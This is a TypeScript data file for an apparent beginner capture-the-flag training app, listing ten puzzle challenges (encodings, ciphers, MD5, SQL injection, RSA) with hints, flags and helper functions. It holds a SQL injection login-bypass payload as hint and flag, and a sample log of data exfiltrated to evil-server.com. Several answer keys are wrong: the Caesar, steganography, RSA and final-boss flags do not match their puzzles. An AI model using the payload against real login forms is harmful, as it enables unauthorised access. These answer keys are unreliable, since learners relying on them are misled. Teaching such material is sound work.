import { CTFChallenge } from '../types';

export const ctfChallenges: CTFChallenge[] = [
  {
    id: 'welcome',
    title: 'Welcome to the Matrix',
    difficulty: 'easy',
    points: 10,
    description: 'Your first step into the digital realm. Decode the welcome message.',
    content: `🎯 Challenge: Decode the Base64 message\n\nEncoded Message: SGVsbG8gSGFja2VyIQ==\n\n💡 Hint: This is a common encoding used in web development.\nUse online tools or your programming knowledge to decode it!`,
    hint: 'Base64 is a common encoding scheme. Try searching for "base64 decode" online, or use the command line tool if you know it!',
    flag: 'Hello Hacker!',
    reward: '🎉 Welcome to the hacker community! You\'ve unlocked the "Decoder" badge!'
  },
  
  {
    id: 'caesar',
    title: 'Caesar\'s Secret',
    difficulty: 'easy',
    points: 15,
    description: 'Julius Caesar used this cipher to protect his military communications.',
    content: `🏛️ Challenge: Decrypt Caesar\'s message\n\nCipher Text: FDHVDU FLSKHU LV HDV\n\n📜 Historical Note: Caesar used a shift of 3 in his original cipher.\nEach letter is shifted by a fixed number of positions in the alphabet.\n\nExample: A → D, B → E, C → F (shift of 3)`,
    hint: 'Caesar cipher shifts each letter by a fixed amount. Try shifting each letter back by 3 positions in the alphabet. A=1, B=2, C=3... Z=26',
    flag: 'CAESAR CIPHER IS EASY',
    reward: '🏛️ Ave! You have mastered the ancient art of cryptography! Caesar would be proud!'
  },
  
  {
    id: 'binary',
    title: 'Binary Basics',
    difficulty: 'easy',
    points: 20,
    description: 'Everything in computers is just 1s and 0s. Can you speak the machine language?',
    content: `🤖 Challenge: Convert binary to text\n\nBinary Message:\n01001000 01100001 01100011 01101011 01100101 01110010\n\n💻 Each group of 8 bits represents one ASCII character.\nFind the ASCII values and convert them to letters!\n\nExample: 01000001 = 65 in decimal = 'A' in ASCII`,
    hint: 'Convert each 8-bit binary number to decimal, then look up the ASCII character for that number. Online binary-to-text converters can help!',
    flag: 'Hacker',
    reward: '🤖 Beep boop! You now speak fluent binary! The machines welcome you!'
  },
  
  {
    id: 'hash_crack',
    title: 'Hash Detective',
    difficulty: 'medium',
    points: 30,
    description: 'A password hash has been intercepted. Can you crack it?',
    content: `🔐 Challenge: Crack the MD5 hash\n\nHash: 5d41402abc4b2a76b9719d911017c592\n\n🕵️ This is a common password. Try popular passwords or use online rainbow tables.\nMD5 is an old hashing algorithm that\'s vulnerable to rainbow table attacks.\n\n💡 Think simple - what\'s one of the most common passwords ever used?`,
    hint: 'This hash corresponds to a very simple, common password. Think of what people often use as their first password. It\'s a greeting!',
    flag: 'hello',
    reward: '🔓 Hash cracked! You\'ve learned why strong passwords are essential. Never use common passwords in real life!'
  },
  
  {
    id: 'steganography',
    title: 'Hidden in Plain Sight',
    difficulty: 'medium',
    points: 35,
    description: 'Sometimes the most important information is hidden where you least expect it.',
    content: `🖼️ Challenge: Find the hidden message\n\nLook carefully at this ASCII art:\n\n ██╗  ██╗██╗██████╗ ██████╗ ███████╗███╗   ██╗\n ██║  ██║██║██╔══██╗██╔══██╗██╔════╝████╗  ██║\n ███████║██║██║  ██║██║  ██║█████╗  ██╔██╗ ██║\n ██╔══██║██║██║  ██║██║  ██║██╔══╝  ██║╚██╗██║\n ██║  ██║██║██████╔╝██████╔╝███████╗██║ ╚████║\n ╚═╝  ╚═╝╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝\n\n🔍 The message isn\'t in the art itself...\nLook at the FIRST letter of each line of this challenge description!`,
    hint: 'Steganography often hides messages in unexpected places. Read the first letter of each line in the challenge description above!',
    flag: 'HIDDEN',
    reward: '👁️ Excellent observation skills! You\'ve mastered the art of steganography - hiding in plain sight!'
  },
  
  {
    id: 'sql_injection',
    title: 'Database Infiltration',
    difficulty: 'medium',
    points: 40,
    description: 'A poorly secured login form awaits. Can you bypass the authentication?',
    content: `💾 Challenge: SQL Injection Simulation\n\nLogin Form Query (simulated):\nSELECT * FROM users WHERE username = \'[INPUT]\' AND password = \'[PASSWORD]\'\n\n🎯 Goal: Bypass login without knowing the real password\n\n💡 What if you could make the query always return true?\nThink about SQL logic operators...\n\nExample: What happens if username = \'admin\' OR \'1\'=\'1\'--\'?`,
    hint: 'SQL injection works by breaking out of the intended query structure. Try: admin\' OR \'1\'=\'1\' -- (the -- comments out the password check)',
    flag: "admin' OR '1'='1' --",
    reward: '🛡️ SQL injection mastered! Remember: Always use parameterized queries in real applications to prevent this!'
  },
  
  {
    id: 'reverse_engineering',
    title: 'Code Archaeology',
    difficulty: 'hard',
    points: 50,
    description: 'Reverse engineer this obfuscated JavaScript function to find the secret.',
    content: `🔍 Challenge: Deobfuscate the code\n\nObfuscated Function:\nfunction _0x1234(){var _0xa=['secret','flag','is','cyber'];return _0xa[0]+_0xa[2]+_0xa[3];}\n\n🧩 This function returns a string. What does it return?\nAnalyze the array and the return statement.\n\n💻 Trace through the code step by step:\n1. What\'s in the array _0xa?\n2. What indices are being accessed?\n3. What\'s the final concatenated result?`,
    hint: 'Look at the array: [\'secret\',\'flag\',\'is\',\'cyber\']. The function returns _0xa[0]+_0xa[2]+_0xa[3], which is array[0] + array[2] + array[3].',
    flag: 'secretiscyber',
    reward: '🔬 Reverse engineering complete! You can now read obfuscated code like a pro! This skill is invaluable in cybersecurity.'
  },
  
  {
    id: 'network_forensics',
    title: 'Packet Detective',
    difficulty: 'hard',
    points: 60,
    description: 'Analyze this network traffic log to find the exfiltrated data.',
    content: `📡 Challenge: Network Traffic Analysis\n\nHTTP Request Log:\n192.168.1.100 -> 10.0.0.5\nGET /search?q=dGVzdA== HTTP/1.1\nHost: evil-server.com\nUser-Agent: DataExfiltrator/1.0\n\n🕵️ Suspicious activity detected!\nThe query parameter \'q\' contains base64 encoded data.\nWhat information is being exfiltrated?\n\n🔍 Decode the base64 to reveal the stolen data!`,
    hint: 'The suspicious part is \'q=dGVzdA==\'. This looks like base64 encoding (notice the == padding). Decode this base64 string to find what data was stolen.',
    flag: 'test',
    reward: '🌐 Network forensics mastered! You can now track data exfiltration attempts. This is a crucial skill for incident response!'
  },
  
  {
    id: 'cryptography_rsa',
    title: 'RSA Rookie',
    difficulty: 'hard',
    points: 75,
    description: 'Break this simple RSA implementation. Sometimes small keys lead to big problems.',
    content: `🔐 Challenge: RSA Cryptanalysis\n\nRSA Parameters:\nn = 77 (public modulus)\ne = 7 (public exponent)\nEncrypted message: 23\n\n🧮 RSA Security relies on the difficulty of factoring large numbers.\nBut n=77 is quite small...\n\n💡 Steps:\n1. Factor n = 77 into p × q\n2. Calculate φ(n) = (p-1)(q-1)\n3. Find d where e × d ≡ 1 (mod φ(n))\n4. Decrypt: message = 23^d mod n`,
    hint: '77 = 7 × 11, so p=7, q=11. φ(n) = 6×10 = 60. Find d where 7×d ≡ 1 (mod 60). Try d=43: 7×43=301, 301 mod 60 = 1. So d=43. Finally: 23^43 mod 77.',
    flag: '2',
    reward: '🔑 RSA cryptanalysis complete! You understand why large key sizes are essential for security. Small keys = big vulnerabilities!'
  },
  
  {
    id: 'final_boss',
    title: 'The Final Challenge',
    difficulty: 'expert',
    points: 100,
    description: 'Combine all your skills for the ultimate test. Multiple layers of security await.',
    content: `👑 FINAL BOSS CHALLENGE 👑\n\nMulti-layered Security System:\n\nLayer 1 - Steganography:\nMessage: \'The First letter Of each Word Reveals Everything Needed\'\n\nLayer 2 - Caesar Cipher (shift 13/ROT13):\nPYRNE GRKG: \'SVANY PUNYYRATR\'\n\nLayer 3 - Binary:\n01000110 01001100 01000001 01000111\n\nLayer 4 - Reverse:\nGALF (reverse this)\n\n🎯 Combine all decoded parts in order to form the final flag!`,
    hint: 'Solve each layer: 1) First letters spell POWER, 2) ROT13 decode SVANY PUNYYRATR, 3) Binary to ASCII, 4) Reverse GALF. Combine all results!',
    flag: 'POWER FINAL CHALLENGE FLAG',
    reward: '🏆 CONGRATULATIONS! 🏆\n\nYou have completed all challenges and proven yourself as a true cyber warrior!\n\n🎖️ MASTER HACKER BADGE UNLOCKED\n🌟 You are now ready for real-world cybersecurity challenges!\n\n"With great power comes great responsibility." - Use your skills ethically!'
  }
];

// Helper function to get challenge by difficulty
export function getChallengesByDifficulty(difficulty: string): CTFChallenge[] {
  return ctfChallenges.filter(challenge => challenge.difficulty.toLowerCase() === difficulty.toLowerCase());
}

// Helper function to calculate total possible points
export function getTotalPossiblePoints(): number {
  return ctfChallenges.reduce((total, challenge) => total + (challenge.points || 0), 0);
}

// Helper function to get next challenge based on current progress
export function getNextChallenge(solvedChallenges: string[]): CTFChallenge | null {
  return ctfChallenges.find(challenge => !solvedChallenges.includes(challenge.id)) || null;
}

// Helper function to get completion percentage
export function getCompletionPercentage(solvedChallenges: string[]): number {
  return Math.round((solvedChallenges.length / ctfChallenges.length) * 100);
}

// Helper function to get difficulty progression
export function getDifficultyProgression(solvedChallenges: string[]): { [key: string]: number } {
  const progression = {
    'Beginner': 0,
    'Intermediate': 0,
    'Advanced': 0,
    'Expert': 0
  };
  
  const difficultyMap: { [key: string]: keyof typeof progression } = {
    'easy': 'Beginner',
    'medium': 'Intermediate',
    'hard': 'Advanced',
    'expert': 'Expert'
  };
  
  solvedChallenges.forEach(challengeId => {
    const challenge = ctfChallenges.find(c => c.id === challengeId);
    if (challenge && difficultyMap[challenge.difficulty]) {
      progression[difficultyMap[challenge.difficulty]]++;
    }
  });
  
  return progression;
}